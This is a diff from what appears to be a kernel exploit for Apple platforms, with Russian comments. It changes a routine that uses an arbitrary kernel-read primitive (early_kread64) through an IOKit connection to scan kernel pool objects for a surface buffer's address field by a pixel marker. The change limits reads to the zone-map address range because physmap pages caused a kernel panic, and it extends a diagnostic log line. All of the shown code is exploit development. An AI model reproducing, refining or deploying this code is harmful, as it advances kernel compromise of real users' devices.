@@ -6311,16 +6311,18 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
                 if (npool198 >= 15) break;
             }
         }
-        int nFld199 = 0;
+        int nFld199 = 0, nSkipPM = 0;
         for (int pi = 0; pi < npool198 && !vaFldObj; pi++) {
             uint64_t obj = pools198[pi];
             if (!kpLooksLikeKernelPointer(obj) || !kpSafeToRead(obj)) continue;
             for (uint32_t o = 0; o + 8 <= poolSz198[pi] && !vaFldObj; o += 8) {
                 uint64_t P = kp_untag_ptr(early_kread64(obj + o));
                 if (!kpLooksLikeKernelPointer(P)) continue;
-                // 1.9.199: kpSafeToRead(P) УБРАН — walker слеп на zone-map VA (там и
-                // живёт буфер!), поле фильтровалось само. early_kread64 читает zone-map
-                // свободно; на невалидном — FATAL-шум, но не смерть.
+                // 1.9.200: контент-читаем ТОЛЬКО zone-map (0xffffffd0…–0xffffffef…):
+                // буфер поверхности живёт там; physmap-полоса (0xfffffff0…) —
+                // смертельные страницы (far=0xfffffff033e99c10, паника 03:33).
+                BOOL zoneBand = (P >= 0xffffffd000000000ULL && P < 0xfffffff000000000ULL);
+                if (!zoneBand) { nSkipPM++; continue; }
                 nFld199++;
                 uint64_t v = early_kread64(P);
                 if ((uint32_t)v != 0x41544159) continue;   // маркер пикселей dst
@@ -6333,7 +6335,7 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
                           rb3 == ctlKVA ? @"ПРИЛИПЛО" : @"МИМО"]);
             }
         }
-        if (!vaFldObj) kpNote(r, [NSString stringWithFormat:@"  [VAD] VA-поле не найдено (пулов=%d, полей проверено=%d) — следующий шаг: pv_head/второй уровень", npool198, nFld199]);
+        if (!vaFldObj) kpNote(r, [NSString stringWithFormat:@"  [VAD] VA-поле не найдено (пулов=%d, полей проверено=%d, physmap-скип=%d) — следующий шаг: pv_head/второй уровень", npool198, nFld199, nSkipPM]);
     }
     // 3. Trusted-path резолв surfVA через M2 async op-entry (1.9.124):
     //    async submit резолвит surface ptr в op-entry БЕЗ execute/снапшота
